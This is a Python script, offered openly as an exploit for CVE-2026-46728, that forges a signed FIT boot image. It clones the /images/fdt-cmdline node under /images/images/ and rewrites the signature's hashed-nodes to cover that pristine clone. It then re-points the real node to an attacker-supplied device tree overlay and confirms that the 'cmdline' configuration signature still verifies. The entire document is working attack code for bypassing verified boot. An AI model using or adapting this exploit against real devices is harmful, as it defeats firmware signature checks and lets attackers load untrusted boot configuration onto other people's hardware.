#!/usr/bin/env python3
"""CVE-2026-46728 cmdline-config-only clone attack.
Vendor kernel + board DTB stay under their original valid signature.
Only the 'cmdline' config signature is fooled: /images/fdt-cmdline cloned
pristine under /images/images/, real node re-pointed to our overlay dtbo."""
import hashlib, struct, sys
from build_attack_fit import (parse_header, tokenize, serialize, find_subtree,
                              prop_name, hashed_stream, u32)

def main():
    orig_path, out_path, dtbo_path = sys.argv[1:4]
    dtbo = open(dtbo_path, "rb").read()
    dtbo_hash = hashlib.sha256(dtbo).digest()

    d = open(orig_path, "rb").read()
    H = parse_header(d)
    struct_blk = d[H["off_struct"]:H["off_struct"] + H["sz_struct"]]
    strings = d[H["off_strings"]:H["off_strings"] + H["sz_strings"]]
    rsv = d[H["off_rsv"]:H["off_struct"]]
    ext = d[H["totalsize"]:]
    toks = tokenize(struct_blk)

    img_s, img_e = find_subtree(toks, "/images")
    sig_s, sig_e = find_subtree(toks, "/configurations/cmdline/signature-0")
    fdt_s, fdt_e = find_subtree(toks, "/images/fdt-cmdline")

    def get_prop(t_s, t_e, name):
        for i in range(t_s + 1, t_e):
            t, v = toks[i]
            if t == "PROP" and prop_name(strings, v[0]) == name:
                return v[2]
        raise KeyError(name)

    hashed_nodes = get_prop(sig_s, sig_e, "hashed-nodes").split(b"\0")
    hashed_strings = struct.unpack(">II", get_prop(sig_s, sig_e, "hashed-strings"))
    inc_orig = [x.decode() for x in hashed_nodes if x]
    base_stream = hashed_stream(toks, strings, inc_orig, hashed_strings)
    print(f"[baseline] cmdline sig stream: {len(base_stream)} bytes, sha256={hashlib.sha256(base_stream).hexdigest()}")

    # 1. rewrite hashed-nodes (pristine toks) -> clones
    inc_new = ["/", "/configurations/cmdline",
               "/images/images/fdt-cmdline", "/images/images/fdt-cmdline/hash-1"]
    new_hn = b"".join(x.encode() + b"\0" for x in inc_new)
    for i in range(sig_s + 1, sig_e):
        t, v = toks[i]
        if t == "PROP" and prop_name(strings, v[0]) == "hashed-nodes":
            toks[i] = ("PROP", (v[0], len(new_hn), new_hn, (v[3] + b"\0\0\0")[:(-len(new_hn)) % 4]))
            break

    # 2. clone /images subtree; upstream EMPTYNO as clone's LAST child
    #    (closes the walked span before the wrapper END leaks 4 bytes)
    copy = toks[img_s:img_e + 1]
    # find nameoff for a benign prop name (e.g. the root "description")
    root_s, root_e = find_subtree(toks, "/")
    dsc_off = None
    for i in range(root_s + 1, root_e):
        if toks[i][0] == "PROP" and prop_name(strings, toks[i][1][0]) == "description":
            dsc_off = toks[i][1][0]
            break
    empty = [("BEGIN", (b"EMPTYNO", b"")),
             ("PROP", (dsc_off, 0, b"", b"")),
             ("END", None)]
    copy = copy[:-1] + empty + copy[-1:]
    new_toks = toks[:img_e] + copy + toks[img_e:]

    # 3. patch REAL fdt-cmdline: appended dtbo, fixed hash
    def patch_prop(t_s, t_e, name, newdata):
        for i in range(t_s + 1, t_e):
            t, v = new_toks[i]
            if t == "PROP" and prop_name(strings, v[0]) == name:
                assert len(newdata) == v[1]
                new_toks[i] = ("PROP", (v[0], v[1], newdata, v[3]))
                return
        raise KeyError(name)

    a4 = lambda x: (x + 3) & ~3
    dtbo_off = a4(len(ext))
    patch_prop(fdt_s, fdt_e, "data-offset", u32(dtbo_off))
    patch_prop(fdt_s, fdt_e, "data-size", u32(len(dtbo)))
    hs, he = find_subtree(new_toks, "/images/fdt-cmdline/hash-1")
    patch_prop(hs, he, "value", dtbo_hash)

    # digest check
    attack_stream = hashed_stream(new_toks, strings, inc_new, hashed_strings)
    if base_stream != attack_stream:
        for i, (a, b) in enumerate(zip(base_stream, attack_stream)):
            if a != b:
                print(f"[-] diverge at {i}: {base_stream[max(0,i-8):i+8].hex()} vs {attack_stream[max(0,i-8):i+8].hex()}")
                break
        sys.exit("[-] streams differ")
    print("[+] DIGEST STREAMS IDENTICAL - cmdline signature will verify")

    # assemble
    new_struct = serialize(new_toks)
    strings_off = H["off_struct"] + len(new_struct)
    totalsize = a4(strings_off + len(strings))
    hdr = bytearray(d[:40])
    struct.pack_into(">I", hdr, 4, totalsize)
    struct.pack_into(">I", hdr, 8, H["off_struct"])
    struct.pack_into(">I", hdr, 12, strings_off)
    struct.pack_into(">I", hdr, 32, len(strings))
    struct.pack_into(">I", hdr, 36, len(new_struct))
    blob = bytes(hdr) + rsv + new_struct + strings
    blob += b"\0" * (totalsize - len(blob))
    ext2 = bytearray(ext) + b"\0" * (dtbo_off - len(ext)) + dtbo
    ext2 += b"\0" * (a4(len(ext2)) - len(ext2))
    open(out_path, "wb").write(blob + bytes(ext2))
    print(f"[+] wrote {out_path}: total={len(blob)+len(ext2)} (orig {len(d)})")
    print(f"[+] cmdline dtbo at ext+0x{dtbo_off:x} size={len(dtbo)}")
    print(f"[+] kernel/board configs: UNTOUCHED (original valid signatures)")

if __name__ == "__main__":
    main()
